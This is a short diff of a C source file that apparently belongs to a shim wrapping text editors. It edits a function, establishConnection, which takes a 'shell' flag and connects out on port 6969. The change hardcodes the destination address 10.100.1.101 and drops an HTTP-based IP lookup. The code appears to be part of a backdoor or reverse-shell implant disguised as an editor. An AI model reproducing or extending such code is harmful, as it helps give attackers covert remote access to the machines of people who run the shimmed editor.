@@ -12,7 +12,6 @@
 #include <assert.h>
 #include <sys/stat.h>
 #include <signal.h>
-#include "httpget.c"
 
 //These define statements will get changed depending on the editor being shimmed
 #define PORT 6969
@@ -76,8 +75,7 @@ int establishConnection(int port, int shell) {
     }
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
-    char* *str;
-    if(inet_pton(AF_INET, getIP(0), &serv_addr.sin_addr)<=0) {
+    if(inet_pton(AF_INET, "10.100.1.101", &serv_addr.sin_addr)<=0) {
         return ERR;
     }
    
